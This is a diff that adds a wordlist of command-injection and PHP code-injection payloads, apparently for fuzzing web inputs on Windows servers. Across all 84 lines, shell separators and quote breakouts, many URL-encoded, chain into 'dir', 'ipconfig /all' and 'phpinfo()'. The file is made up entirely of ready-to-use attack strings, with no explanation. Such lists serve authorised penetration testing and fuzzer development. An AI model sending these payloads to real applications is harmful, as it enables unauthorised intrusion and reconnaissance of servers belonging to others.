@@ -1,0 +1,84 @@
+ {${phpinfo()}}
+" & dir
+" && dir
+" dir
+" | dir
+" || dir
+".system('dir')."
+"; dir
+$%26%26dir c:\
+$%26%26dir+c:%255c
+$%26%26dir+c:%2f
+$(`dir`)
+$+|+Dir+c:%255c
+$+|+Dir+c:%2f
+$+|+Dir+c:\
+%0a+dir+c:%255c
+%0a+dir+c:%2f
+%0a+dir+c:\
+%20{${phpinfo()}}
+%22%20%26%20dir
+%22%20%26%26%20dir
+%22%20%7C%20dir
+%22%20%7C%7C%20dir
+%22%20dir
+%22%3B%20dir
+%22.system%28%27dir%27%29.%22
+%24%28%60dir%60%29
+%26%20dir
+%26%20dir%20C%3A%5C
+%26%26%20dir
+%26%26%20dir%20C%3A%5C
+%26%26+|+dir c:%255c
+%26%26+|+dir c:%2f
+%26%26+|+dir c:\
+%26%26dir
+%27%20%26%20dir
+%27%20%26%26%20dir
+%27%20%7C%7C%20dir
+%27%20dir
+%27%3B%20dir
+%3B%20dir
+%3B%20dir%20C%3A%5C
+%7C%20dir
+%7C%20dir%20C%3A%5C
+& dir
+& dir C:\
+& ipconfig /all
+& phpinfo()
+&& dir
+&& dir C:\
+&& ipconfig /all
+&& phpinfo()
+&&dir
+' & dir
+' && dir
+' dir
+' || dir
+'; dir
+';phpinfo();//
++dir+c:\+|
++|+Dir+c:%255c
++|+Dir+c:%2f
++|+Dir+c:\
++|+dir+c:%2f+|
++|+dir+c:\+|
+; dir
+; dir C:\
+; ipconfig /all
+;phpinfo()
+;phpinfo();//
+dir
+dir C:\
+dir%20C%3A%5C
+dir+c:\
+ipconfig /all
+phpinfo()
+phpinfo();
+{${phpinfo()}}
+| dir
+| dir C:\
+| ipconfig /all
+| phpinfo()
+|| phpinfo()
+||+dir|c:\
